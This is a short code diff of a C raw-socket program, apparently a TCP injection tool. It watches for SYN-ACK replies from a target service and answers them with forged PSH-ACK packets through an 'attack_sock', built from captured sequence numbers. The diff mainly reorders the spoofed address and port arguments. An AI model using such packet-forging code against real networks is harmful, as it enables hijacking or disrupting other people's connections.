@@ -32,8 +32,8 @@
 
 // Functions
 uint16_t ip_checksum(void*,size_t);
-void send_synack(const int, const char *, const char *, const uint32_t, const uint32_t, 
-    const uint16_t, const uint16_t, uint32_t, uint32_t);
+// void send_synack(const int, const char *, const char *, const uint32_t, const uint32_t, 
+//     const uint16_t, const uint16_t, uint32_t, uint32_t);
 void send_pshack(const size_t, const int, const char *, const char *, const uint32_t, const uint32_t, 
     const uint16_t, const uint16_t, uint32_t, uint32_t);
 void print_ip_header(unsigned char* , int);
@@ -173,10 +173,9 @@ int main(int argc, char *argv[]) {
             if (iph -> protocol != IPPROTO_TCP) goto final; // check if packet is TCP packet
             if ((tcph -> syn != 1) || (tcph -> ack != 1)) goto final; // only care about syn ack packets
             if ((iph -> saddr != service_addr) && (tcph -> source != service_port)) goto final; // destination has to be the service
-            print_tcp_packet(buf, num); // log the packet
-            fprintf(logfile, "DEBUG finished printing packet\n");
+            print_tcp_packet(buf, num); // log the packet;
             // send_synack(attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // syn ack
-            send_pshack(sizeof data, attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->seq) + 1, ntohl(tcph->ack_seq)); // psh ack
+            send_pshack(sizeof data, attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq) + 1, ntohl(tcph->ack_seq)); // psh ack
             goto final;
         }
     }
